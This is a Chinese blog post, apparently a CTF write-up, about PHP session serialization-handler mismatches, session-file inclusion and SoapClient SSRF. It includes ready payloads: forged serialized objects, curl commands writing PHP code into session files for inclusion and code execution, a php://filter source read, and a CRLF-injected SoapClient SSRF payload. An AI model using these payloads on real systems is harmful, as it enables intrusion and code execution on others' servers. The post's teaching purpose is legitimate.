---
layout: post
title:  PHP反序列化之session,soap，ssrf漏洞与利用详述
noToc: true
date:   2018-11-25 22:30:00 +0800
tags: WEB安全
cover: '../assets/test5.png'
---

# PHP反序列化之session,soap，ssrf漏洞与利用详述

**文章首发于i春秋：**https://bbs.ichunqiu.com/thread-48210-1-1.html

[TOC]




## PHP session序列化及反序列化处理器设置使用不当带来的安全问题

### PHP Session 序列化及反序列化处理器简述

------

PHP 内置了多种处理器用于存取 $_SESSION 数据时会对数据进行序列化和反序列化，通过查找资料常用的有以下三种，对应三种不同的处理格式：

| 处理器                      | 对应的存储格式                                               |
| --------------------------- | ------------------------------------------------------------ |
| php                         | 键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值          |
| php_binary                  | 键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值 |
| php_serialize  (php>=5.5.4) | 经过 serialize() 函数反序列处理的数组                        |

### 配置选项 session.serialize_handler

------

PHP 提供了 session.serialize_handler 配置选项，通过该选项可以设置序列化及反序列化时使用的处理器：

`session.serialize_handler "php" PHP_INI_ALL`

### 安全隐患

通过上面对存储格式的分析，如果 PHP 在反序列化存储的 $_SESSION 数据时的**使用的处理器和序列化时使用的处理器不同**，会导致数据无法正确反序列化，通过特殊的构造，甚至可以伪造任意数据：）

```
$_SESSION['ryat'] = '|O:8:"stdClass":0:{}';
```

例如上面的 $_SESSION 数据，在存储时使用的序列化处理器为 php_serialize，存储的格式如下：

```
a:1:{s:4:"ryat";s:20:"|O:8:"stdClass":0:{}";}
```

在读取数据时如果用的反序列化处理器不是 php_serialize，而是 php 的话，那么反序列化后的数据将会变成：

```
#!php
// var_dump($_SESSION);
array(1) {
  ["a:1:{s:4:"ryat";s:20:""]=>
  object(stdClass)#1 (0) {
  }
}
```

可以看到，通过注入 `|` 字符伪造了对象的序列化数据，成功实例化了 stdClass 对象：）

### 实际利用

------

#### i）当 session.auto_start＝On 时：

当配置选项 session.auto_start＝On，会自动注册 Session 会话，因为该过程是发生在脚本代码执行前，所以在脚本中设定的包括序列化处理器在内的 session 相关配选项的设置是不起作用的，因此一些需要在脚本中设置序列化处理器配置的程序会在 session.auto_start＝On 时，销毁自动生成的 Session 会话，然后设置需要的序列化处理器，再调用 session_start() 函数注册会话，这时如果脚本中设置的序列化处理器与 php.ini 中设置的不同，就会出现安全问题，如下面的代码：

```
#!php
//foo.php

if (ini_get('session.auto_start')) {
    session_destroy();
}

ini_set('session.serialize_handler', 'php_serialize');
session_start();

$_SESSION['ryat'] = $_GET['ryat'];
```

当第一次访问该脚本，并提交数据如下：

```
foo.php?ryat=|O:8:"stdClass":0:{}
```

脚本会按照 php_serialize 处理器的序列化格式存储数据：

```
a:1:{s:4:"ryat";s:20:"|O:8:"stdClass":0:{}";}
```

当第二次访问该脚本时，PHP 会按照 php.ini 里设置的序列化处理器反序列化存储的数据，这时如果 php.ini 里设置的是 php 处理器的话，将会反序列化伪造的数据，成功实例化了 stdClass 对象：）

这里需要注意的是，因为 PHP 自动注册 Session 会话是在脚本执行前，所以通过该方式只能注入 PHP 的内置类。

#### ii）当 session.auto_start＝Off 时：

当配置选项 session.auto_start＝Off，两个脚本注册 Session 会话时使用的序列化处理器不同，就会出现安全问题，如下面的代码：

```
#!php
//foo1.php

ini_set('session.serialize_handler', 'php_serialize');
session_start();

$_SESSION['ryat'] = $_GET['ryat'];


//foo2.php

ini_set('session.serialize_handler', 'php');
//or session.serialize_handler set to php in php.ini 
session_start();

class ryat {
    var $hi;

    function __wakeup() {
        echo 'hi';
    }
    function __destruct() {
        echo $this->hi;
    }
}
```

当访问 foo1.php 时，提交数据如下：

```
foo1.php?ryat=|O:4:"ryat":1:{s:2:"hi";s:4:"ryat";}
```

脚本会按照 php_serialize 处理器的序列化格式存储数据，访问 foo2.php 时，则会按照 php 处理器的反序列化格式读取数据，这时将会反序列化伪造的数据，成功实例化了 ryat 对象，并将会执行类中的 __wakeup 方法和 __destruct 方法：）
## PHP Session 反序列化
### 安恒429|web 3 session反序列化-Alictf web 400 Recruitment
查找资料关于PHP Session 反序列化在安恒杯一次ctf也曾出现此类考点，稍微以此例总结一下。
我们知道上传模块可以从外部URL获取内容这样它可以使用curl或file_get_contents函数，如果没有检查URL，那么它会变成SSRF vuln
经过有心人士大佬的对此题的总结Alictf web 400 Recruitment原题的WriteUP是这样子的直接移步http://math1as.com/2016/06/10/Alictf-web-400-Recruitment-II-Write-Up/`在这道题中找到一些新的东西**PHP session**
session的序列化是指,存储到session文件中的是经过序列化的字符串,而我们能访问到的$_SESSION是已经被解析的变量,而php在session存储和读取数据时,都会有一个序列化和反序列化的过程。而反序列化中会调用对象的magic方法,比如destruct(),wakeup()等。那么这里有一个配置选项 session.serialize_handler

可以用ini_set或者在php.ini中加以设置，由前面介绍可知有下面几种用于处理序列化的处理器类型：
1）：php
2）：php_binary
3）：php_serialize
由前面可知对于php处理器,如果我们先用php_serialize加以序列化,那么对于这样的一个字符串


    a:1:{s:4:"test";s:20:"|O:8:"stdClass":0:{}";}

最后会被解释为:键名为 a:1:{s:4:"test";s:20:" 的一个对象

而php处理器序列化,则是把$_SESSION的每个键值都 **单独** 拿出来,比如$_SESSION['test']，就是test|序列化的值。

那么如果在处理器session.serialize_handler=php_serialize的情况下，我们构造**带有竖线**的字符串,在其他处理器为php的地方,就可以反序列化出伪造的对象。这里明显是需要去操作session的。

然而很多时候没有这个条件的,怎么办呢

http://php.net/manual/zh/session.upload-progress.php

php为了提供一个上传进度的数据

$n=ini_get("session.upload_progress.name");

会把它存储在$_SESSION["$n"] 当中。

这样我们构造一个文件上传页,就可以成功写入session了。

关于session的利用此处还想到一个trick:session+lfi。移步XCTF-bestphp1。

###XCTF-bestphp1-session+lfi
原题目代码如下：

[![img](https://p0.ssl.qhimg.com/t01f4635c2ec475fad7.png)](https://p0.ssl.qhimg.com/t01f4635c2ec475fad7.png)

代码非常简短，但是问题很明确，我们看到了函数

```
call_user_func($func,$_GET);
```
，原题目还考变量覆盖，引发任意文件包含。例如：

```
?function=extract&file=php://filter/read=convert.base64-encode/resource=index.php
```
此处不是重点，主要讨论session漏洞利用问题session+lfi
由代码：

```
ini_set('open_basedir', '/var/www/html:/tmp');
```

我们无法直接去包含默认路径

```
/var/lib/php/sessions/sess_phpsessid
```
那么怎么办？
可以看到***session_start（）***查看php手册，通过save_path方式可以更改session存储路径，那我们尝试一下

    ?function=session_start&save_path=/tmp

然后去包含，可以成功包含session.
***RCE***
通过session.upload_progress可知，可以进行控制session的内容，但是似乎有点麻烦，不难发现这里有一个$_SESSION[‘name’]，并且其可以被我们post的name复制，那这就可以达到控制session内容的目的。
我们尝试

    curl -v -X POST -d "name=<?=phpinfo();?>" http://vps_ip:port/?function=session_start&save_path=/tmp

再去包含对应的session

    ?function=extract&file=/tmp/sess_jisv70lep6v1nfokagdll4scs7

得到


[![img](https://p3.ssl.qhimg.com/t0163dfa112b4a2322f.png)](https://p3.ssl.qhimg.com/t0163dfa112b4a2322f.png)

尝试读取目录

```
curl -v -X POST -d "name=<?=var_dump(scandir('./'));?>" http://vps_ip:port/?function=session_start&save_path=/tmp
```

包含文件

```
?function=extract&file=/tmp/sess_3b624no3ucdj27un5idq57jta0
```

可以成功列目录

[![img](https://p3.ssl.qhimg.com/t018eb738f6f6676f81.png)](https://p3.ssl.qhimg.com/t018eb738f6f6676f81.png)
##PHP session反序列化+SOAP+SSRF漏洞综合利用

用最近LCTF一道WEB题分析，原题目bestphp’s revenge
index.php
```
<?php
highlight_file(__FILE__);
$b = 'implode';
call_user_func($_GET[f],$_POST);
session_start();
if(isset($_GET[name])){
    $_SESSION[name] = $_GET[name];
}
var_dump($_SESSION);
$a = array(reset($_SESSION),'welcome_to_the_lctf2018');
call_user_func($b,$a);
?>
```
盗用一张原题目的图片，
flag.php
[![img](https://p0.ssl.qhimg.com/t0105f01419067557d8.png)](https://p0.ssl.qhimg.com/t0105f01419067557d8.png)
原题代码非常少，但是可以知道SSRF,由题目知需满足以下两点条件：
1）访问127.0.0.1/flag.php
2）cookie可控，改成我们的php_session_id
关于这两点的利用，需要构造一个可以控制cookie，同时又具备SSRF的能力。这里就需要用到一个内置类SOAPClient,通过此类进行SSRF,往下分析之前先对SoapClient进行一个简单的脑补。
###SoapClient基本概念
什么是SOAP？
SOAP,简单对象访问协议是交换数据的一种协议规范，是一种轻量的、简单的、基于XML（标准通用标记语言下的一个子集）的协议。
SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(UniversalDescriptionDiscovery andIntegration)之一， soap用来描述传递信息的格式， WSDL 用来描述如何访问具体的接口， uddi用来管理，分发，查询webService 。
    WebService是一种跨平台，跨语言的规范，用于不同平台，不同语言开发的应用之间的交互。比如在Windows Server服务器上有个C#.Net开发的应用A，在Linux上有个Java语言开发的应用B，B应用要调用A应用，或者是互相调用。用于查看对方的业务数据。这个时候，如何解决呢？
WebService就是出于以上类似需求而定义出来的规范：开发人员一般就是在具体平台开发webservice接口，以及调用webservice接口。每种开发语言都有自己的webservice实现框架。
而SOAP作为webService三要素SOAP 可以和现存的许多因特网协议和格式结合使用，包括超文本传输协议（HTTP），简单邮件传输协议（SMTP），多用途网际邮件扩充协议（MIME）。
***SOAP的组成***
一条 SOAP消息的组成：一个包含有一个必需的 SOAP 的封装包，一个可选的 SOAP 标头和一个必需的 SOAP 体块的 XML 文档。
SOAP消息格式：

```x&#39;m&#39;l
<?xml
　version="1.0"?>
<soap:Envelope
　xmlns:soap="http://www.w3.org/2001/12/soap-envelope"
　soap:encodingStyle="http://www.w3.org/2001/12/soap-encoding">
<soap:Header>
</soap:Header>
<soap:Body>
<soap:Fault>
</soap:Fault>
</soap:Body>
</soap:Envelope>
```

其中
Envelope: 标识XML文档，具有名称空间和编码详细信息。
Header：包含标题信息，如内容类型和字符集等。
Body：包含请求和响应信息。
Fault：错误和状态信息。

###bestphp’s revenge分析
接上，通过以上分析可以想到可利用php内置类soapclient进行SSRF,但是还需要触发反序列化问题。具体可以看飘零师傅的文章https://www.anquanke.com/post/id/153065#h2-5
看一下简单的用法
```
<?php
$a = new SoapClient(null,array(location'=>'http://example.com:2333','uri'=>'123'));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c->a();
```
这样我们就能触发SSRF了
![20181119112213-4ec840fa-ebaa-1]({{site.baseurl}}/assets/images/20181119112213-4ec840fa-ebaa-1.jpg)
再回到题目：

看到：


```
if(isset($_GET[name])){
  $_SESSION[name] = $_GET[name];
}
```

我们不难想到，可以将序列化内容通过$_GET[name]传入session，发现session里的内容是会被进行一次序列化写入的，并且还有

```
name |
```
存在。无法直接触发反序列化了。这就又回到了之前介绍的php session处理器机制上。可以控制session.serialize_handler，通过

```
/?f=session_start

serialize_handler=php
```

这样的方式，可以指定php序列化引擎。由之前的分析可知，php在反序列化存储$_session时使用的处理器和序列化时使用的处理器不同，会导致数据无法正确反序列化，通过特殊的构造，甚至可以伪造任意数据。
假如我们使用`php_serialize`引擎时进行数据存储时的序列化，可以得到内容

```
$_SESSION[‘name’] = ‘sky’;
a:1:{s:4:”name”;s:3:”sky”;}
```

而在php引擎时进行数据存储时的序列化，可以得到另一个内容

```
$_SESSION[‘name’] = ‘sky’;
name|s:3:”sky”
```

那么如果我们用php引擎去解php_serialize得到的序列化,这时就会出现问题了。
***分析***
php引擎会以|作为作为key和value的分隔符，我们再传入内容的时候，比如传入

```
$_SESSION[‘name’] = ‘|sky‘
```

那么使用php_serialize引擎时可以得到序列化内容

```
a:1:{s:4:”name”;s:4:”|sky”;}
```

然后用php引擎反序列化时，|被当做分隔符，于是

```
a:1:{s:4:”name”;s:4:”
```

被当作key

```
sky
```

被当做vaule进行反序列化

于是，我们只要传入

```
$_SESSION[‘name’] = |序列化内容
```
即可。
***触发__call***
我们看到soapclient想要触发__call()必须要调用不可访问的方法，那我们如何在题目有限的代码里调用不可访问方法呢？

看到这段代码

    php $a = array(reset($_SESSION),'welcome_to_the_lctf2018'); call_user_func($b,$a);

这里想到如下操作

我们只要覆盖$b为call_user_func即可成功触发不可访问方法
***payload***
```
<?php
$target='http://127.0.0.1/flag.php';
$b = new SoapClient(null,array('location' => $target,
                               'user_agent' => "AAA:BBBrn" .
                                             "Cookie:PHPSESSID=dde63k4h9t7c9dfl79np27e912",
                               'uri' => "http://127.0.0.1/"));

$se = serialize($b); 
echo urlencode($se);
```
先发送第一段payload

![img](https://p3.ssl.qhimg.com/t01ca2d21f6702a6fa4.png)

在发送第二段payload

![t01aa4e8c03a2f8e3b2]({{site.baseurl}}/assets/images/t01aa4e8c03a2f8e3b2.png)

即可得到flag。***PS:***构造payload,这里我们要将cookie添加到header中，所以通过user_agent的Crlf来达到目的。
